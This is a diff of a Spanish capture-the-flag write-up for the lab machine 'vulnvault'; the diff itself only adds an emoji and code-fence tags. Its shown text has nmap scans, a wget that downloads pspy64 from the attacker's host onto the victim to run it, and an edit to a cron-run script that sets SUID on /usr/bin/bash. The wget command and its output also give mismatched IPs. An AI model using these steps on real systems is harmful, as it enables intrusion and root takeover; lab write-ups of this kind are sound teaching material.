@@ -1,4 +1,4 @@
-# Maquina vulnvault
+# 💻 Maquina vulnvault
 
 ![](https://darkened-raisin-b9c.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F89ee8e04-ef1a-4e1f-bd35-dd38f517fa16%2Fc4957249-01b5-4771-b9fd-39af9f612f5f%2Fimage.png?table=block\&id=1045f89f-9238-8098-b0d9-fcf67ccf3aba\&spaceId=89ee8e04-ef1a-4e1f-bd35-dd38f517fa16\&width=2000\&userId=\&cache=v2)
 
@@ -12,13 +12,13 @@
 
 Empezamos escaneando los puertos disponibles en la maquina:
 
-```
+```shell
 sudo nmap -sS -p- --open -T5 -n -Pn -v 172.17.0.2 -oG allports
 ```
 
 Obtenemos los siguientes puertos abiertos :
 
-```
+```sh
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 14:43 -05
 Initiating ARP Ping Scan at 14:43
 Scanning 172.17.0.2 [1 port]
@@ -43,7 +43,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds
 
 En el resultado que nos arroja vemos que tenemos los puertos 22,80 por lo tanto realizamos un análisis mas detallado para ver que servicios están corriendo por estos:
 
-```
+```sh
 > nmap -sCV -p22,80 172.17.0.2 -oG Puertos
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 14:47 -05
 Nmap scan report for vulnvault.dl (172.17.0.2)
@@ -120,14 +120,14 @@ Al ver que no hay nada relevante procedo a descargar pspy64 y transferirlo la ma
 
 Desde mi maquina.
 
-```
+```shell-session
 > python3 -m http.server 443
 Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
 ```
 
 Maquina Victima, una vez recibimos el script le damos privilegios y ejecutamos.
 
-```
+```shell
 wget http://194.168.145.145:443/pspy64
 --2024-09-30 22:29:31--  http://192.168.153.145:443/pspy64
 Connecting to 192.168.153.145:443... connected.
@@ -149,7 +149,7 @@ Encontramos que se esta ejecutando constantemente el archivo `/usr/local/bin/ech
 
 Ingresamos al directorio y vemos que tiene permisos de escritura por lo que lo editamos para poder escalar privilegios
 
-```
+```sh
 nano /usr/local/bin/echo.sh
 #!/bin/bash
 chmod u+s /usr/bin/bash
